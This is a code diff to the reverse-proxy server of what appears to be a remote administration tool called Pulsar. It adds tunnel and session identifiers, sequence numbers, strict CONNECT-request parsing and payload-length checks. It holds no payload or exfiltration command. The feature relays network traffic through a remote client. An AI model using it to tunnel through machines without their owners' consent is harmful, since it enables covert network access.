@@ -1,10 +1,12 @@
 ﻿using Pulsar.Common.Messages.Administration.ReverseProxy;
+using Pulsar.Common.Networking;
 using Pulsar.Server.Networking;
 using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Net.Sockets;
 using System.Text;
+using System.Threading;
 
 namespace Pulsar.Server.ReverseProxy
 {
@@ -48,6 +50,11 @@ namespace Pulsar.Server.ReverseProxy
 
         public Socket Handle { get; private set; }
         public Client Client { get; private set; }
+        private static long _nextConnectionId;
+        public string ListenerSessionId { get; private set; }
+        public string TunnelId { get; private set; }
+        public string OriginClientId { get; private set; }
+        private long _sequence;
         private bool _receivedConnResponse = false;
 
         //Is used for the handshake, Non-Blocking
@@ -61,10 +68,7 @@ namespace Pulsar.Server.ReverseProxy
 
         private byte[] _buffer;
 
-        public int ConnectionId
-        {
-            get { return Handle.Handle.ToInt32(); }
-        }
+        public int ConnectionId { get; private set; }
 
         public string TargetServer { get; private set; }
         public ushort TargetPort { get; private set; }
@@ -87,6 +91,10 @@ namespace Pulsar.Server.ReverseProxy
 
         public ReverseProxyClient(Client client, Socket socket, ReverseProxyServer server)
         {
+            this.ConnectionId = (int)(Interlocked.Increment(ref _nextConnectionId) & 0x7fffffff);
+            this.ListenerSessionId = server.ListenerSessionId;
+            this.TunnelId = Guid.NewGuid().ToString("N");
+            this.OriginClientId = client.EndPoint?.Address?.ToString() ?? client.GetHashCode().ToString();
             this.Handle = socket;
             this.Client = client;
             this._handshakeStream = new MemoryStream();
@@ -161,44 +169,48 @@ namespace Pulsar.Server.ReverseProxy
                             else if (headerStr.StartsWith("CONNECT") && headerStr.Contains(":"))
                             {
                                 Type = ProxyType.HTTPS;
+                                string request = Encoding.ASCII.GetString(payload);
+                                int headerEnd = request.IndexOf("\r\n\r\n", StringComparison.Ordinal);
+                                if (headerEnd < 0)
+                                    break;
 
-                                //Grab here the IP / PORT
-                                using (StreamReader sr = new StreamReader(new MemoryStream(payload)))
+                                string[] lines = request.Substring(0, headerEnd).Split(
+                                    new[] { "\r\n" }, StringSplitOptions.None);
+                                if (lines.Length == 0)
                                 {
-                                    string line = sr.ReadLine();
-                                    if (line == null)
-                                        break;
-
-                                    //could have done it better with RegEx... oh well
-                                    string[] split = line.Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
-                                    if (split.Length > 0)
-                                    {
-                                        try
-                                        {
-                                            string ipPort = split[1];
-                                            this.TargetServer = ipPort.Split(':')[0];
-                                            this.TargetPort = ushort.Parse(ipPort.Split(':')[1]);
-
-                                            this._isConnectCommand = true;
-                                            this._isDomainNameType = true;
-
-                                            //Send Command to client and wait for response from CommandHandler
-                                            Client.Send(new ReverseProxyConnect
-                                            {
-                                                ConnectionId = ConnectionId,
-                                                Target = TargetServer,
-                                                Port = TargetPort
-                                            });
-                                            Server.CallonConnectionEstablished(this);
-
-                                            return; //Quit receiving and wait for client's response
-                                        }
-                                        catch
-                                        {
-                                            Disconnect();
-                                        }
-                                    }
+                                    Disconnect();
+                                    break;
                                 }
+
+                                string[] requestLine = lines[0].Split(
+                                    new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
+                                if (requestLine.Length != 3 ||
+                                    !requestLine[0].Equals("CONNECT", StringComparison.OrdinalIgnoreCase) ||
+                                    !TryParseAuthority(requestLine[1], out string authorityHost, out ushort authorityPort))
+                                {
+                                    SendToClient(Encoding.ASCII.GetBytes(
+                                        "HTTP/1.1 400 Bad Request\r\nConnection: close\r\n\r\n"));
+                                    Disconnect();
+                                    break;
+                                }
+
+                                this.TargetServer = authorityHost;
+                                this.TargetPort = authorityPort;
+                                this._isConnectCommand = true;
+                                this._isDomainNameType = true;
+
+                                Client.Send(new ReverseProxyConnect
+                                {
+                                    ConnectionId = ConnectionId,
+                                    Target = TargetServer,
+                                    Port = TargetPort,
+                                    ListenerSessionId = ListenerSessionId,
+                                    TunnelId = TunnelId,
+                                    Sequence = Interlocked.Increment(ref _sequence),
+                                    OriginClientId = OriginClientId
+                                });
+                                Server.CallonConnectionEstablished(this);
+                                return;
                             }
                             else
                             {
@@ -257,7 +269,11 @@ namespace Pulsar.Server.ReverseProxy
                                     {
                                         ConnectionId = ConnectionId,
                                         Target = TargetServer,
-                                        Port = TargetPort
+                                        Port = TargetPort,
+                                        ListenerSessionId = ListenerSessionId,
+                                        TunnelId = TunnelId,
+                                        Sequence = Interlocked.Increment(ref _sequence),
+                                        OriginClientId = OriginClientId
                                     });
                                 }
                             }
@@ -302,7 +318,16 @@ namespace Pulsar.Server.ReverseProxy
                 //send to the Server we've been disconnected
                 try
                 {
-                    Client.Send(new ReverseProxyDisconnect { ConnectionId = ConnectionId });
+                    Client.Send(new ReverseProxyDisconnect
+                    {
+                        ConnectionId = ConnectionId,
+                        ListenerSessionId = ListenerSessionId,
+                        TunnelId = TunnelId,
+                        Sequence = Interlocked.Increment(ref _sequence),
+                        OriginClientId = OriginClientId,
+                        Status = Pulsar.Common.Enums.ReverseProxyStatus.Stopped,
+                        Reason = "proxy_socket_closed"
+                    });
                 }
                 catch { }
             }
@@ -364,6 +389,45 @@ namespace Pulsar.Server.ReverseProxy
                 SendToClient(new byte[] { SOCKS5_VERSION_NUMBER, SOCKS5_CMD_REPLY_SUCCEEDED });
         }
 
+        private static bool TryParseAuthority(string authority, out string host, out ushort port)
+        {
+            host = null;
+            port = 0;
+
+            if (string.IsNullOrWhiteSpace(authority) ||
+                authority.Length > ReverseProxyValidation.MaxTargetLength)
+                return false;
+
+            authority = authority.Trim();
+            int separator = -1;
+
+            if (authority.StartsWith("[", StringComparison.Ordinal))
+            {
+                int closeBracket = authority.IndexOf(']');
+                if (closeBracket <= 1)
+                    return false;
+
+                host = authority.Substring(1, closeBracket - 1);
+                if (closeBracket + 1 >= authority.Length || authority[closeBracket + 1] != ':')
+                    return false;
+
+                separator = closeBracket + 1;
+            }
+            else
+            {
+                separator = authority.LastIndexOf(':');
+                if (separator <= 0 || separator != authority.IndexOf(':'))
+                    return false;
+
+                host = authority.Substring(0, separator);
+            }
+
+            string portText = authority.Substring(separator + 1);
+            return ReverseProxyValidation.IsValidTarget(host) &&
+                   ushort.TryParse(portText, out port) &&
+                   ReverseProxyValidation.IsValidPort(port);
+        }
+
         private bool CheckProxyVersion(byte[] payload)
         {
             if (Type == ProxyType.HTTPS)
@@ -380,6 +444,13 @@ namespace Pulsar.Server.ReverseProxy
 
         public void HandleCommandResponse(ReverseProxyConnectResponse response)
         {
+            if (response == null ||
+                !string.Equals(response.ListenerSessionId, ListenerSessionId, StringComparison.Ordinal) ||
+                !string.Equals(response.TunnelId, TunnelId, StringComparison.Ordinal))
+            {
+                return;
+            }
+
             //a small prevention for calling this method twice, not required... just incase
             if (!_receivedConnResponse)
             {
@@ -484,7 +555,18 @@ namespace Pulsar.Server.ReverseProxy
 
                 byte[] payload = new byte[received];
                 Array.Copy(_buffer, payload, received);
-                Client.Send(new ReverseProxyData { ConnectionId = ConnectionId, Data = payload });
+                if (!ReverseProxyValidation.IsValidPayloadLength(payload.Length))
+                    throw new InvalidOperationException("Invalid reverse proxy payload length.");
+
+                Client.Send(new ReverseProxyData
+                {
+                    ConnectionId = ConnectionId,
+                    Data = payload,
+                    ListenerSessionId = ListenerSessionId,
+                    TunnelId = TunnelId,
+                    Sequence = Interlocked.Increment(ref _sequence),
+                    OriginClientId = OriginClientId
+                });
 
                 LengthSent += payload.Length;
                 PacketsSended++;
